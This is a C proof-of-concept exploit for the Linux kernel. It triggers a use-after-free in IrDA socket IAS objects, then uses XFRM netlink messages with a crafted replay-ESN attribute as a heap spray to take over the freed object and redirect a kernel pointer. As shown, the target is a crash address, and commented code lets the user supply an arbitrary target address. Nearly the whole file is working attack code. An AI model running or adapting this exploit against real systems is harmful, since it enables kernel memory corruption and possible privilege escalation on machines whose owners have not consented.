#define _GNU_SOURCE
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include "irda.h"
#include <fcntl.h>
#include <sched.h>
#include <unistd.h>
#define CRASH_ADDR 0xffffffffdeadbeef
#define NLA_LENGTH(len)					\
        (NLA_ALIGN(sizeof(struct nlattr)) + (len))
#define NLMSG_TAIL(nmsg)						\
        ((struct nlattr *) (((void *) (nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))
#define NLA_DATA(nla)					\
        ((void*)(((char*)(nla)) + NLA_LENGTH(0)))
char *saddr = "1111111122222222";
char *daddr = "3333333344444444";
struct sockaddr_nl addr;
struct req_newae {
	struct nlmsghdr n;
	struct xfrm_aevent_id id;
	char buf[2048];
};
struct req_newsa {
	struct nlmsghdr n;
	struct xfrm_usersa_info xsinfo;
	char buf[2048];
};
void create_ns(void)
{
	if(unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(1);
	}
}
int create_netlink_socket()
{
	int fd,err;
	fd = socket(AF_NETLINK,SOCK_RAW,NETLINK_XFRM);
	if( fd < 0) {
		perror("socket");
		return -1;
	}
	memset(&addr,0,sizeof(struct sockaddr_nl));
	addr.nl_family = AF_NETLINK;
	addr.nl_pid = 0; /* packet goes into the kernel */
	addr.nl_groups = XFRMNLGRP_NONE; /* no need for multicast group */
	return fd;
}
int send_msg(int fd,struct nlmsghdr *msg)
{
	int err;
	err = sendto(fd,(void *)msg,msg->nlmsg_len,0,(struct sockaddr*)&addr,
		     sizeof(struct sockaddr_nl));
	if (err < 0) {
		perror("sendto");
		return -1;
	}
	return 0;
}
int add_attr(struct nlmsghdr *n,int maxlen,int type,const void *data,int attrlen)
{
	struct nlattr *nl;
	int len = NLA_LENGTH(attrlen);
	nl = NLMSG_TAIL(n);
	nl->nla_type = type;
	nl->nla_len = len;
	memcpy(NLA_DATA(nl),data,attrlen);
	n->nlmsg_len =NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(len);
	return 0;
}
struct req_newsa *build_sa_frame(unsigned char *payload,u_int32_t size)
{
	struct req_newsa *r;
	in_addr_t src,dst;
	struct xfrm_mark mark = {0x0,0x0};
	struct xfrm_algo *algo;
	struct xfrm_replay_state_esn *esn;
	size_t esn_size;
	r = malloc(sizeof(struct req_newsa));
	if (!r) {
		perror("malloc");
		return NULL;
	}
	r->n.nlmsg_type = XFRM_MSG_NEWSA;
	r->n.nlmsg_flags = NLM_F_REQUEST|NLM_F_CREATE|NLM_F_EXCL;
	r->n.nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
	r->xsinfo.lft.soft_byte_limit = XFRM_INF;
	r->xsinfo.lft.hard_byte_limit = XFRM_INF;
	r->xsinfo.lft.soft_packet_limit = XFRM_INF;
	r->xsinfo.lft.hard_packet_limit = XFRM_INF;
	r->xsinfo.mode = XFRM_MODE_TUNNEL;
	r->xsinfo.flags = XFRM_STATE_ESN;
	src = inet_addr(saddr);
	dst = inet_addr(daddr);
	r->xsinfo.family = AF_INET6;
	//r->xsinfo.saddr.a4 = src;
	//r->xsinfo.id.daddr.a4 = dst;
	memcpy((char*)r->xsinfo.saddr.a6,saddr,16);
	memcpy((char*)r->xsinfo.id.daddr.a6,daddr,16);
	r->xsinfo.id.proto = IPPROTO_AH;
	r->xsinfo.id.spi = 12345;
	add_attr(&r->n,sizeof(r->buf),XFRMA_MARK,&mark,sizeof(mark));
	algo = malloc(sizeof(struct xfrm_algo)+32+1);
	if(!algo) {
		perror("algo allocation");
		return NULL;
	}
	memset(algo->alg_name,0,sizeof(algo->alg_name));
	strcpy(algo->alg_name,"hmac(sha256)");
	algo->alg_key_len = 0xcc;
	strncpy(algo->alg_key,"12345678901234567890123456789012",32);
	add_attr(&r->n,sizeof(r->buf),XFRMA_ALG_AUTH,algo,sizeof(struct xfrm_algo)+33);
	/* build ens */
	esn_size = sizeof(struct xfrm_replay_state_esn) + 1024;
	esn = (struct xfrm_replay_state_esn *)payload;
	/* This is mandatory, in order to let the kernel parse the nlattr structure
	 * if we want to use a specific memory location, we must allocate a memory
	 * with size=target address , which is a 32-bit value
	 */
	esn->bmp_len = (size - sizeof(struct xfrm_replay_state_esn))/4;
	add_attr(&r->n,sizeof(r->buf),XFRMA_REPLAY_ESN_VAL,esn,esn_size);
	return r;
}
void trigger() {
	open("/proc/sys/net/core/somaxconn",O_RDONLY);
	printf("See crash ? \n");
}
void spray_heap(u_int8_t *payload,u_int32_t size,int iter)
{
	int fd,err;
	struct req_newae *r;
	struct req_newsa *sa;
	int i,j;
#define SOCKFD 1000
	int fds[SOCKFD];
	/* don't make iter >= 1000, or change SOCKFD
	   to a greated value */
	sa = build_sa_frame(payload,size);
	for(i=0;i<iter;i++) {
		fd = create_netlink_socket();
		//printf("send %d\n",i);
		send_msg(fd,&sa->n);
		fds[i] = fd;
		/* don't close fds */
		//free(sa); /* don't need to do this*/
		usleep(1000);
	}
	//free(sa);
}
int irda_set_ias(int fd,char *name)
{
	struct irda_ias_set set;
	int err = 0;
	memset(&set,0,sizeof(set));
	strncpy(set.irda_class_name,name,64);
	memset(&set.irda_attrib_name,'C',255);
	set.irda_attrib_type = 2;
	set.attribute.irda_attrib_octet_seq.len = 8;
	memset(&set.attribute.irda_attrib_octet_seq.octet_seq,0x41,1023);
	set.daddr = 4;
	err = setsockopt(fd,0x10a,0x2,&set,sizeof(set));
	//printf("setsockopt(SET) fd=%d  err=%d\n",fd,err);
	return err;
}
int irda_bind(int fd,u_int16_t  family,u_int8_t lsap_sel,int sir_addr,char *name)
{
	struct sockaddr_irda sa,sa1;
	int err;
	memset(&sa,0,sizeof(sa));
	sa.sir_family =family;
	sa.sir_lsap_sel = lsap_sel;
	sa.sir_addr = sir_addr;
	memcpy(&sa.sir_name,name,25);
	err = bind(fd,(struct sockaddr*)&sa,sizeof(sa));
	//printf("bind fd=%d err=%d\n",fd,err);
	return err;
}
void uaf(unsigned long target_addr)
{
	int fd1,fd2,fd3,fd4;
	struct sockaddr_irda sa,sa1;
	struct irda_ias_set set;
	int err = 0;
	pthread_t tid[1024];
	memset(&set,0,sizeof(set));
	fd1 = socket(0x17,0x5,0);
	fd2 = socket(0x17,0x5,0);
	fd3 = socket(0x17,0x5,0);
	fd4 = socket(0x17,0x5,0);
	/* create namespace for xfrm
	 * this is not required to trigger the bug
	 */
	create_ns();
	irda_bind(fd1,4,0x4a,0x3,"c");
	int i;
	irda_bind(fd2,4,0x4b,0x3,"c");
	irda_bind(fd3,4,0x4c,0x3,"c");
	irda_bind(fd1,4,0x4a,0x3,"c");
	for(i=0;i<5;i++) {
		/* 0x00 means that it takes self->ias_obj */
		irda_set_ias(fd2,"\x00");
		irda_set_ias(fd3,"\x00");
	}
	close(fd1);
	close(fd3);
	/* annoying the queue and free the first queued object*/
	printf("[+] Freeing the first queued ias object \n");
	close(fd2);
	//getchar();
	sleep(1);
	unsigned char *buf = malloc(4096);
	pid_t pid;
	u_int64_t addr = 0xffffffff81f01500;
	addr = 0xffffffff81efeb60;
	//addr = 0xdeadbeef;
	addr = target_addr;
	void *x = &addr;
	memset(buf,0xcc,88);
	*(void **)(buf+8) = (void*)addr;
	printf("[+] Spray memory and take control of the old freed object\n");
	spray_heap(buf,88,200);
	usleep(10000);
	printf("[+] Allocating new object to overwrite the targetted pointer\n");
	irda_bind(fd4,4,0x30,0x3,"c");
	printf("[+] Freeing object again \n");
	close(fd4);
	sleep(1);
	printf("[+] Fill the last object with payload \n");
	memset(buf,0xcc,88);
	spray_heap(buf,88,200);
	usleep(1000);
}
int main(int argc,char **argv)
{
	sleep(1);
	unsigned long target_addr = CRASH_ADDR;
	pid_t pid;
	//if(argc != 2) {
	//	printf("%s <target object>\n",*argv);
	//	return -1;
	//}
	//sscanf(argv[1],"%lx",&target_addr);
	uaf(target_addr);
	trigger();
}
